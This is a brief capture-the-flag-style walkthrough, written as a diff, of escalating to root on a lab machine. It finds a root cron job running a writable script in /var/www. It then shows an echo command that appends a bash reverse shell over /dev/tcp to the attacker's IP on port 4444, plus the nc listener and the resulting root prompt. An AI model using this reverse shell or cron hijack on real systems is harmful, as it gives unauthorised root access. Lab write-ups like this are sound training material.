@@ -1,0 +1,38 @@
+step 1:-
+find username and password than go to the ssh and access the server shell.
+
+step 2:-after gain shell access we need to escalat privileges and become root
+
+here we show in /etc/crontab
+
+cmd:-cat /etc/crontab
+
+ans:-
+...
+$ cat /etc/crontab
+# m h dom mon dow user command
+17 * * * * root    cd / && run-parts --report /etc/cron.hourly
+25 6 * * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6 1 * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh
+
+here we show the crontab and go to gtfbio and so the this filled is vuln.
+
+step 3:-
+than i enter my reverse shell script to .mysecretcronjob.sh
+
+cmd:-cd /var/www && echo "bash -c 'exec bash -i &>/dev/tcp/$MY-VM-IP-ADDRESS/4444 <&1'" >> .mysecretcronjob.sh
+
+than go to the terminal and type
+
+cmd:-nc -lvnp 4444
+nc -lvnp 4444
+Listening on [0.0.0.0] (family 0, port 4444)
+Connection from $IP 51612 received!
+bash: cannot set terminal process group (4279): Inappropriate ioctl for device
+bash: no job control in this shell
+root@kral4-PC:/var/www#
+
+here we show the we got access as a root.
